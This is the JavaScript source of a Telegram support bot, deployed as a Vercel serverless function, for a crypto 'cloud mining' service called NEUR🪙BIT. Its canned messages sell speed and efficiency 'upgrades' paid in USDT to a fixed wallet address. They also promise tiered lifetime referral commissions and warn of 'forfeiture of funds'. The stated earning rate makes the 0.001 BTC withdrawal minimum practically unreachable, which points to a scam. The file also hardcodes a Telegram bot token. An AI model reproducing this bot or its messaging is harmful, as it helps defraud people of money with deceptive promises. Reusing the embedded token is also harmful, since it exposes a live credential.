// NEUR🪙BIT Support Bot - Vercel Serverless Function
// ============================================

const TELEGRAM_TOKEN = "8472213941:AAH-VINkkuvjx7f4fKa2SHOgU9GF5bDVn0M";
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
const MAIN_BOT_USERNAME = "https://t.me/Btcdkminingbot";

// Support team contacts
const SUPPORT_TEAM = {
    admin1: "https://t.me/neurobitadmin145",
    admin2: "https://t.me/neurobitadmin145",
    email: "neurobithelp@gmail.com"
};

const ADMIN_USERNAME = "neurobitadmin145";
const BOT_USERNAME = "Btcdkminingbot";

// ============================================
// COMMAND HANDLERS
// ============================================

async function handleStart(chatId) {
    const message = `
🪙 **Welcome to NEUR🪙BIT Support!**

I'm here to help with any questions about NEUR🪙BIT and the BTC DK Mining System.

**Main Bot:** [@${BOT_USERNAME}](https://t.me/${BOT_USERNAME})

**Available Commands:**
/faq - Frequently asked questions
/contact - Contact support team
/status - Check system status
/rules - Platform rules
/mining - Mining guide
/withdraw - Withdrawal guide
/upgrade - Upgrade guide
/referral - Referral program info

How can I help you today? 👇
    `;
    
    await sendMessage(chatId, message);
}

async function handleFAQ(chatId) {
    const message = `
❓ **Frequently Asked Questions**

**Q: How do I start mining?**
A: Go to [@${BOT_USERNAME}](https://t.me/${BOT_USERNAME}) → Click "Open App" → Start a 2-hour mining session.

**Q: What's the minimum withdrawal?**
A: Minimum withdrawal is 0.001 BTC. Network fee: 0.0001 BTC.

**Q: How do I upgrade?**
A: Go to Upgrade tab → Choose Speed ($29.99) or Efficiency ($79.99) → Send USDT to provided address → Paste transaction hash.

**Q: How long does verification take?**
A: Usually 1-5 minutes. Etherscan verifies 3 confirmations.

**Q: Does mining continue if I leave?**
A: YES! Mining continues for the full 2-hour session. You'll get all missed rewards when you return.

**Q: How do referrals work?**
A: Share your referral link. Earn 5-15% lifetime commission on friends' mining rewards.

For more help, use /contact
    `;
    
    await sendMessage(chatId, message);
}

async function handleContact(chatId) {
    const message = `
📞 **Contact Support Team**

**Priority Support:**
• Admin: [@neurobitadmin145](https://t.me/neurobitadmin145)
• Email: neurobithelp@gmail.com

**Response Times:**
• General inquiries: 1-4 hours
• Technical issues: 30-60 minutes
• Payment verification: 10-30 minutes

**Please include:**
• Your Telegram username
• Transaction hash (if payment issue)
• Screenshots (if applicable)

Click below to contact support directly 👇
    `;
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "📱 Message Admin", url: "https://t.me/neurobitadmin145" },
                { text: "📧 Send Email", url: "mailto:neurobithelp@gmail.com" }
            ],
            [
                { text: "🤖 Main Bot", url: "https://t.me/Btcdkminingbot" }
            ]
        ]
    };
    
    await sendMessage(chatId, message, { reply_markup: JSON.stringify(keyboard) });
}

async function handleStatus(chatId) {
    const message = `
📊 **NEUR🪙BIT System Status**

• Main Bot: ✅ Operational
• Mining System: ✅ Active
• Payment Verification: ✅ Processing
• Withdrawals: ✅ Available
• Support Team: 🟢 Online

Last checked: ${new Date().toLocaleString()}
    `;
    
    await sendMessage(chatId, message);
}

async function handleRules(chatId) {
    const message = `
📜 **Platform Rules**

1. **One account per user** - Multiple accounts will be banned
2. **Fair usage** - No automation scripts or bots
3. **Valid wallet addresses** - Only Bitcoin addresses accepted
4. **Payment verification** - Must provide valid transaction hash
5. **Withdrawal processing** - 1-24 hours for security
6. **Referral fraud** - Self-referrals result in permanent ban
7. **Respectful communication** - No harassment of support team

Violations may result in account suspension and forfeiture of funds.
    `;
    
    await sendMessage(chatId, message);
}

async function handleMiningGuide(chatId) {
    const message = `
⛏️ **Mining Guide**

**Step 1:** Go to [@${BOT_USERNAME}](https://t.me/${BOT_USERNAME})
**Step 2:** Click "Open App" button
**Step 3:** Click "Start 2-Hour Mining Session"
**Step 4:** Watch your balance grow automatically!

**Mining Speed:**
• Base: 9 seconds per cycle
• With upgrades: As fast as 3 seconds

**Earnings:**
• Base: 0.000000000000001 BTC per cycle
• With efficiency upgrades: Up to 32x multiplier

**Pro Tip:** Upgrade to mine faster and earn more!
    `;
    
    await sendMessage(chatId, message);
}

async function handleWithdrawGuide(chatId) {
    const message = `
💰 **Withdrawal Guide**

**Requirements:**
• Minimum: 0.001 BTC
• Network fee: 0.0001 BTC (deducted)
• Valid Bitcoin wallet address

**Steps:**
1. Go to Withdraw tab in the app
2. Enter amount (minimum 0.001 BTC)
3. Enter your Bitcoin wallet address
4. Confirm withdrawal
5. Wait 1-24 hours for processing

**Note:** Always double-check your wallet address!
    `;
    
    await sendMessage(chatId, message);
}

async function handleUpgradeGuide(chatId) {
    const message = `
⚡ **Upgrade Guide**

**Speed Upgrade - $29.99**
• Reduces mining time by 3 seconds per level
• Max level: 10 (3 seconds per cycle)
• Send USDT (ERC-20) to provided address

**Efficiency Upgrade - $79.99**
• Doubles mining output per level
• Max level: 5 (32x multiplier)
• Send USDT (ERC-20) to provided address

**Payment Address:** \`0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c\`

After sending, paste your transaction hash for verification (3 confirmations required).
    `;
    
    await sendMessage(chatId, message);
}

async function handleReferralGuide(chatId) {
    const message = `
👥 **Referral Program**

**Commission Tiers:**
• Bronze (1-5 referrals): 5%
• Silver (6-15 referrals): 7%
• Gold (16-30 referrals): 10%
• Platinum (31+ referrals): 15%

**How it works:**
1. Copy your referral link from the app
2. Share with friends
3. They join and start mining
4. You earn lifetime commission on their rewards

**Commission is paid instantly!**
    `;
    
    await sendMessage(chatId, message);
}

// ============================================
// UTILITY FUNCTIONS
// ============================================

async function sendMessage(chatId, text, options = {}) {
    const url = `${TELEGRAM_API}/sendMessage`;
    const payload = {
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown',
        ...options
    };
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

async function handleUpdate(update) {
    if (!update.message) return;
    
    const chatId = update.message.chat.id;
    const text = update.message.text || '';
    
    if (text.startsWith('/start')) {
        await handleStart(chatId);
    } else if (text.startsWith('/faq')) {
        await handleFAQ(chatId);
    } else if (text.startsWith('/contact')) {
        await handleContact(chatId);
    } else if (text.startsWith('/status')) {
        await handleStatus(chatId);
    } else if (text.startsWith('/rules')) {
        await handleRules(chatId);
    } else if (text.startsWith('/mining')) {
        await handleMiningGuide(chatId);
    } else if (text.startsWith('/withdraw')) {
        await handleWithdrawGuide(chatId);
    } else if (text.startsWith('/upgrade')) {
        await handleUpgradeGuide(chatId);
    } else if (text.startsWith('/referral')) {
        await handleReferralGuide(chatId);
    } else {
        await sendMessage(chatId, 
            `❓ Unknown command. Type /start to see available commands.`
        );
    }
}

// ============================================
// VERCEL SERVERLESS FUNCTION
// ============================================

export default async function handler(req, res) {
    // Handle GET request for testing
    if (req.method === 'GET') {
        return res.status(200).json({ 
            status: 'active',
            message: 'NEUR🪙BIT Support Bot is running',
            bot: '@NeurBitSupportBot',
            main_bot: 'https://t.me/Btcdkminingbot',
            support: 'https://t.me/neurobitadmin145',
            email: 'neurobithelp@gmail.com'
        });
    }
    
    // Handle POST request from Telegram webhook
    if (req.method === 'POST') {
        try {
            const update = req.body;
            console.log('Received update:', JSON.stringify(update));
            
            // Process the update asynchronously
            handleUpdate(update).catch(console.error);
            
            // Respond immediately to Telegram
            res.status(200).json({ ok: true });
        } catch (error) {
            console.error('Error processing update:', error);
            res.status(500).json({ error: 'Internal server error' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
